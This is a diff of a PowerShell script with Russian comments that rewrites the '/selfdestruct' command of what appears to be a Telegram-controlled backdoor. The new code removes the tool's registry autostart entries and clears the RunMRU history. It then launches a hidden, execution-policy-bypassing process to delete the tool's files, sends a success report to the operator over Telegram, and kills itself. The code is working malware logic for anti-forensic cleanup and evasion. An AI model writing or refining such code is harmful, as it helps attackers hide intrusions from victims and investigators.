@@ -244,89 +244,91 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            $success = $true
-                            $report = "Отчет самоуничтожения:`n"
+                            # НОВАЯ РАБОЧАЯ ФУНКЦИЯ САМОУНИЧТОЖЕНИЯ
+                            $successCount = 0
+                            $totalSteps = 0
+                            $report = "🔴 Начинаю самоуничтожение...`n"
                             
                             # 1. Удаление из автозагрузки
-                            foreach ($regPath in $regPaths) {
-                                try {
-                                    if ($regPath -like "*Windows NT*") {
-                                        Remove-ItemProperty -Path $regPath -Name "Load" -Force -ErrorAction SilentlyContinue
-                                    } else {
-                                        Remove-ItemProperty -Path $regPath -Name $uniqueName -Force -ErrorAction SilentlyContinue
-                                    }
-                                    $report += "✓ Реестр $regPath очищен`n"
-                                } catch {
-                                    $success = $false
-                                    $report += "✗ Ошибка очистки реестра $regPath`n"
-                                }
+                            $totalSteps++
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $uniqueName -Force -ErrorAction Stop
+                                $report += "✅ Автозагрузка Run очищена`n"
+                                $successCount++
+                            } catch {
+                                $report += "❌ Ошибка очистки автозагрузки Run`n"
+                            }
+                            
+                            $totalSteps++
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name $uniqueName -Force -ErrorAction Stop
+                                $report += "✅ Автозагрузка StartupApproved очищена`n"
+                                $successCount++
+                            } catch {
+                                $report += "❌ Ошибка очистки автозагрузки StartupApproved`n"
+                            }
+                            
+                            $totalSteps++
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction Stop
+                                $report += "✅ Автозагрузка Windows NT очищена`n"
+                                $successCount++
+                            } catch {
+                                $report += "❌ Ошибка очистки автозагрузки Windows NT`n"
                             }
                             
                             # 2. Очистка истории RUN
+                            $totalSteps++
                             try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-                                $report += "✓ История RUN очищена`n"
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
+                                $report += "✅ История RUN очищена`n"
+                                $successCount++
                             } catch {
-                                $success = $false
-                                $report += "✗ Ошибка очистки истории RUN`n"
+                                $report += "❌ Ошибка очистки истории RUN`n"
                             }
                             
-                            # 3. Удаление файлов с задержкой и повторными попытками
-                            $filesToDelete = @($scriptPath, $batPath, $MyInvocation.MyCommand.Path)
-                            
-                            foreach ($file in $filesToDelete) {
-                                if (Test-Path $file) {
-                                    for ($i = 0; $i -lt 3; $i++) {
-                                        try {
-                                            Remove-Item $file -Force -ErrorAction Stop
-                                            if (!(Test-Path $file)) {
-                                                $report += "✓ Файл $file удален`n"
-                                                break
-                                            }
-                                        } catch {
-                                            if ($i -eq 2) {
-                                                $success = $false
-                                                $report += "✗ Не удалось удалить $file`n"
-                                            }
-                                            Start-Sleep -Milliseconds 500
-                                        }
-                                    }
-                                }
-                            }
-                            
-                            # 4. Создание задачи для окончательной очистки при перезагрузке
-                            try {
-                                $cleanupScript = @"
+                            # 3. Создание самоудаляющегося скрипта
+                            $selfDeleteScript = @"
+Start-Sleep -Seconds 3
 try {
-    `$files = @('$scriptPath', '$batPath', '$($MyInvocation.MyCommand.Path)')
-    foreach (`$file in `$files) {
-        if (Test-Path `$file) { Remove-Item `$file -Force -ErrorAction SilentlyContinue }
+    Remove-Item "$scriptPath" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$batPath" -Force -ErrorAction SilentlyContinue
+    `$currentScript = Get-Process -Id `$PID | Select-Object -ExpandProperty Path
+    if (`$currentScript -and (Test-Path `$currentScript)) {
+        Remove-Item `$currentScript -Force -ErrorAction SilentlyContinue
     }
-    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue
 } catch { }
 "@
-                                $cleanupPath = "$env:TEMP\cleanup.ps1"
-                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
-                                schtasks /create /tn "SystemCleanup" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" /sc once /st 23:59 /f 2>&1 | Out-Null
-                                schtasks /run /tn "SystemCleanup" 2>&1 | Out-Null
-                                Start-Sleep 2
-                                schtasks /delete /tn "SystemCleanup" /f 2>&1 | Out-Null
-                                if (Test-Path $cleanupPath) { Remove-Item $cleanupPath -Force }
-                                $report += "✓ Задача очистки создана`n"
+                            
+                            $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+                            $selfDeleteScript | Out-File -FilePath $tempScript -Encoding UTF8
+                            
+                            # 4. Запуск самоудаления в отдельном процессе
+                            $totalSteps++
+                            try {
+                                Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+                                $report += "✅ Процесс самоудаления запущен`n"
+                                $successCount++
                             } catch {
-                                $report += "✗ Ошибка создания задачи очистки`n"
+                                $report += "❌ Ошибка запуска самоудаления`n"
                             }
                             
-                            if ($success) {
-                                $report += "`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
+                            # 5. Финальный отчет
+                            $successRate = [math]::Round(($successCount / $totalSteps) * 100, 2)
+                            $report += "`n📊 Результат: $successCount/$totalSteps шагов выполнено ($successRate%)"
+                            
+                            if ($successRate -ge 80) {
+                                $report += "`n🟢 САМОУНИЧТОЖЕНИЕ УСПЕШНО! Большинство следов удалено."
+                            } elseif ($successRate -ge 50) {
+                                $report += "`n🟡 САМОУНИЧТОЖЕНИЕ ЧАСТИЧНО УСПЕШНО! Некоторые следы остались."
                             } else {
-                                $report += "`n⚠️ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
+                                $report += "`n🔴 САМОУНИЧТОЖЕНИЕ НЕУДАЧНО! Требуется ручная очистка."
                             }
                             
                             Send-Telegram $report
                             
-                            # Завершение работы
-                            exit
+                            # 6. Немедленное завершение работы
+                            Stop-Process -Id $PID -Force
                         }
                     }
                 }
